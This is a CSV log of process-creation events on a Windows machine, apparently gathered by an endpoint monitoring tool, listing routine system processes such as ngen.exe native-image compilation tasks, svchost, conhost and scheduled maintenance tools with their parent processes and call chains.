_ts,Timestamp,PPID,PID,Name,CommandLine,ParentCommandLine,CallChain,ClientId
1783856907625,2026-07-12T11:45:49Z,5496,9004,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\Windows\system32\dmclient.exe""",wininit.exe <- services.exe <- svchost.exe <- dmclient.exe <- conhost.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,6764,9868,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\Windows\system32\sc.exe"" start w32time task_started",wininit.exe <- services.exe <- svchost.exe <- sc.exe <- conhost.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,1320,7992,DiskSnapshot.exe,"""C:\Windows\system32\disksnapshot.exe"" -z",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- DiskSnapshot.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:49Z,7992,6108,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\Windows\system32\disksnapshot.exe"" -z",wininit.exe <- services.exe <- svchost.exe <- DiskSnapshot.exe <- conhost.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:45:50Z,1320,11252,dstokenclean.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:50Z,11252,2680,conhost.exe,,,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:50Z,772,9968,svchost.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:52Z,904,6100,sdiagnhost.exe,,C:\Windows\system32\svchost.exe -k DcomLaunch -p,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:52Z,6100,6296,conhost.exe,,,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:53Z,904,10344,WindowsPackageManagerServer.exe,,C:\Windows\system32\svchost.exe -k DcomLaunch -p,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:53Z,2020,10196,Defrag.exe,,C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s SysMain,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:53Z,10196,9372,conhost.exe,,,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:53Z,772,8020,svchost.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:55Z,2316,4756,CompatTelRunner.exe,,"""C:\Windows\system32\compattelrunner.exe"" -maintenance",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:55Z,5440,1400,ngentask.exe,,taskhostw.exe PiSqmTasks,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:55Z,5440,6008,ngentask.exe,,taskhostw.exe PiSqmTasks,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:55Z,6008,7064,conhost.exe,,,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:56Z,1400,2880,conhost.exe,,,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:56Z,6008,10916,ngen.exe,,,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:56Z,6008,492,ngen.exe,,,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:57Z,1400,4360,ngen.exe,,,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:45:58Z,1400,892,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:03Z,1400,9488,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:03Z,6008,7612,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:03Z,9488,11152,mscorsvw.exe,,,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:05Z,7612,6912,mscorsvw.exe,,,Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:05Z,1400,10104,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:07Z,6008,8648,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:07Z,1400,11144,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:07Z,1400,3568,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:07Z,6008,3416,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:08Z,6008,2476,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:08Z,6008,2824,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:08Z,1400,11232,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:08Z,6008,10004,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:10Z,1400,6576,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:10Z,6008,10808,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:10Z,1400,6800,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:10Z,1400,8328,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:10Z,6008,1372,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:10Z,1400,9672,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:10Z,6008,9600,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:10Z,772,4360,svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s gpsvc,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- svchost.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:46:11Z,6008,11096,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:11Z,1400,7556,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:11Z,6008,10476,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:11Z,1400,8080,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:11Z,6008,8552,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:11Z,1400,8348,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe <- ngentask.exe <- ngen.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:46:11Z,6008,11076,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe <- ngentask.exe <- ngen.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:46:12Z,1400,9052,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:12Z,6008,7744,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:12Z,1400,10928,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:12Z,6008,512,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:12Z,1400,8224,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:12Z,6008,2776,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:12Z,1400,4276,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:13Z,6008,9876,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:13Z,1400,10076,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:13Z,6008,8696,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:13Z,1400,9468,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:13Z,6008,10608,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:13Z,1400,11116,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:14Z,1400,9804,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:14Z,6008,10196,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:14Z,1400,2192,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:14Z,6008,8792,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:14Z,6008,6700,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:14Z,1400,5028,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:15Z,1400,6808,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:15Z,6008,2924,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:15Z,1400,9068,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:15Z,6008,5284,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:15Z,1400,5752,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:15Z,6008,1192,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:17Z,1400,9864,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:17Z,6008,10232,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:17Z,1400,9900,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:17Z,6008,2824,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:19Z,1400,6544,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:19Z,6008,10004,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:19Z,1400,9800,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:19Z,6008,4408,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:19Z,1400,7984,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:19Z,6008,1372,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:19Z,1400,7748,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:20Z,6008,9672,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:20Z,1400,3628,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:20Z,6008,5436,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:20Z,1400,3480,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:20Z,6008,10964,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:21Z,1400,8552,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:21Z,6008,3528,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:21Z,1400,8944,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:23Z,1400,136,ngen.exe,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe"" uninstall ""C:\Windows\assembly\NativeImages_v4.0.30319_32\Microsoft.V28a60cc2#\7942c32800b28c6701d291c00c6fe726\Microsoft.VisualStudio.Tools.Office.Runtime.ni.dll"" /noroot /LegacyServiceBehavior","""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe <- ngentask.exe <- ngen.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:46:23Z,6008,9128,ngen.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe"" uninstall ""C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.P10d01611#\55ca765af09be5e793cd858ebe908f17\Microsoft.PowerShell.Editor.ni.dll"" /noroot /LegacyServiceBehavior","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe <- ngentask.exe <- ngen.exe,C.364907172793f8c7
1783856907625,2026-07-12T11:46:24Z,1400,5876,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:24Z,6008,1080,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:24Z,1400,6140,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:24Z,6008,2448,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:24Z,1400,6932,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:24Z,6008,10080,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:25Z,1400,10340,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:25Z,6008,6200,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:25Z,6008,8404,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:25Z,1400,10608,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:27Z,2316,6912,CompatTelRunner.exe,,"""C:\Windows\system32\compattelrunner.exe"" -maintenance",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:27Z,6008,8212,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:27Z,1400,5536,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:27Z,6008,9996,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:27Z,1400,4232,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:28Z,1400,1704,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:28Z,6008,2924,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:28Z,6008,6416,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:28Z,1400,10364,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:28Z,6008,3044,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:29Z,1400,2476,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:29Z,6008,6196,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:29Z,1400,9392,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:29Z,6008,3148,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:29Z,1400,3740,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:29Z,1400,10808,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:29Z,6008,6296,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:31Z,1400,3656,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:31Z,6008,8640,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:31Z,1400,9600,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:31Z,6008,9672,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:31Z,1400,9556,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:31Z,6008,5436,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:32Z,1400,10040,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:32Z,6008,11100,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
1783856907625,2026-07-12T11:46:32Z,1400,1868,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
